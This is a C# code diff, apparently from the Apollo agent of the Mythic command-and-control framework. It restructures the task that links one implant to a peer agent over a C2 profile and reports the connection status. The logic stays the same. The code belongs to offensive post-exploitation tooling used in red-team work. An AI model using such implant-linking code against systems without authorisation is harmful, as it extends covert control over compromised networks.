@@ -38,19 +38,17 @@ namespace Tasks
             throw new NotImplementedException();
         }
 
-        public override System.Threading.Tasks.Task CreateTasking()
+        public override void Start()
         {
-            return new System.Threading.Tasks.Task(() =>
+            TaskResponse resp;
+            ApolloInterop.Classes.P2P.Peer p = null;
+            try
             {
-                TaskResponse resp;
-                ApolloInterop.Classes.P2P.Peer p = null;
-                try
+                LinkParameters parameters = _jsonSerializer.Deserialize<LinkParameters>(_data.Parameters);
+                p = _agent.GetPeerManager().AddPeer(parameters.ConnectionInfo);
+                p.UUIDNegotiated += (object o, UUIDEventArgs a) =>
                 {
-                    LinkParameters parameters = _jsonSerializer.Deserialize<LinkParameters>(_data.Parameters);
-                    p = _agent.GetPeerManager().AddPeer(parameters.ConnectionInfo);
-                    p.UUIDNegotiated += (object o, UUIDEventArgs a) =>
-                    {
-                        resp = CreateTaskResponse(
+                    resp = CreateTaskResponse(
                         $"Established link to {parameters.ConnectionInfo.Hostname}",
                         true,
                         "completed",
@@ -66,55 +64,56 @@ namespace Tasks
                                 MetaData = ""
                             }
                         });
-                        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-                    };
-                    p.Disconnect += (object o2, EventArgs a2) =>
-                    {
-                        resp = CreateTaskResponse(
-                            $"\nLost link to {parameters.ConnectionInfo.Hostname}",
-                            true,
-                            "error",
-                            new IMythicMessage[1]
-                            {
-                                new EdgeNode()
-                                {
-                                    Source = _agent.GetUUID(),
-                                    Destination = p.GetMythicUUID(),
-                                    Direction = EdgeDirection.SourceToDestination,
-                                    Action = "remove",
-                                    C2Profile = parameters.ConnectionInfo.C2Profile.Name,
-                                    MetaData = ""
-                                }
-                            });
-                        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-                    };
-                    _agent.GetTaskManager().AddTaskResponseToQueue(
-                        CreateTaskResponse("", false, "", new IMythicMessage[] {
-                            Artifact.NetworkConnection(parameters.ConnectionInfo.Hostname)
-                        }));
-                    if (!p.Start())
-                    {
-                        resp = CreateTaskResponse(
-                            $"Failed to connect to {parameters.ConnectionInfo.Hostname}",
-                            true,
-                            "error");
-                        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-                        _agent.GetPeerManager().Remove(p);
-                    }
-                }
-                catch (Exception ex)
+                    _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+                };
+                p.Disconnect += (object o2, EventArgs a2) =>
                 {
                     resp = CreateTaskResponse(
-                        $"{ex.StackTrace}\n\nFailed to establish connection. Reason: {ex.Message}",
+                        $"\nLost link to {parameters.ConnectionInfo.Hostname}",
+                        true,
+                        "error",
+                        new IMythicMessage[1]
+                        {
+                            new EdgeNode()
+                            {
+                                Source = _agent.GetUUID(),
+                                Destination = p.GetMythicUUID(),
+                                Direction = EdgeDirection.SourceToDestination,
+                                Action = "remove",
+                                C2Profile = parameters.ConnectionInfo.C2Profile.Name,
+                                MetaData = ""
+                            }
+                        });
+                    _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+                };
+                _agent.GetTaskManager().AddTaskResponseToQueue(
+                    CreateTaskResponse("", false, "", new IMythicMessage[]
+                    {
+                        Artifact.NetworkConnection(parameters.ConnectionInfo.Hostname)
+                    }));
+                if (!p.Start())
+                {
+                    resp = CreateTaskResponse(
+                        $"Failed to connect to {parameters.ConnectionInfo.Hostname}",
                         true,
                         "error");
-                    if (p != null)
-                    {
-                        _agent.GetPeerManager().Remove(p);
-                    }
                     _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+                    _agent.GetPeerManager().Remove(p);
                 }
-            }, _cancellationToken.Token);
+            }
+            catch (Exception ex)
+            {
+                resp = CreateTaskResponse(
+                    $"{ex.StackTrace}\n\nFailed to establish connection. Reason: {ex.Message}",
+                    true,
+                    "error");
+                if (p != null)
+                {
+                    _agent.GetPeerManager().Remove(p);
+                }
+
+                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+            }
         }
     }
 }
